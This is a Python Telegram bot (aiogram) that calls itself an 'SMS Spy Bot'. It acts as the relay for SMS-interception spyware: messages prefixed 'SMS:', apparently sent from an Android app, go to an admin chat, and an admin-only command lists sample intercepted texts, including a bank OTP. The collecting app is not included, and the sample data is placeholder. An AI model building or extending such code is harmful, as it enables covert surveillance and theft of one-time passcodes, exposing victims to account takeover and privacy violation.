import asyncio
import json
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# Load config
with open('config.json') as f:
    config = json.load(f)

bot = Bot(token=config['bot_token'])
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    await message.reply("🕵️ SMS Spy Bot - Online")
    # Notify admin
    await bot.send_message(config['admin_chat_id'], "✅ Bot is now live!")
    print(f"Bot activated by user: {message.from_user.id}")

@dp.message_handler(commands=['status'])
async def status_command(message: types.Message):
    await message.reply("🟢 System Operational - Ready for SMS monitoring")
    
@dp.message_handler(commands=['getsms'])
async def get_sms_command(message: types.Message):
    if str(message.chat.id) == config['admin_chat_id']:
        # This will show sample SMS data
        sample_sms = [
            "📱 From: Bank - OTP: 458392",
            "📱 From: Mom - Dinner ready",
            "📱 From: System - Update required"
        ]
        for sms in sample_sms:
            await message.reply(sms)
    else:
        await message.reply("❌ Access denied")

@dp.message_handler()
async def handle_all_messages(message: types.Message):
    # Forward any message from Android app
    if message.text.startswith("SMS:"):
        await bot.send_message(config['admin_chat_id'], f"📨 {message.text}")
        await message.reply("✅ SMS forwarded to admin")

if __name__ == '__main__':
    print("🚀 Starting SMS Spy Bot...")
    executor.start_polling(dp, skip_updates=True)
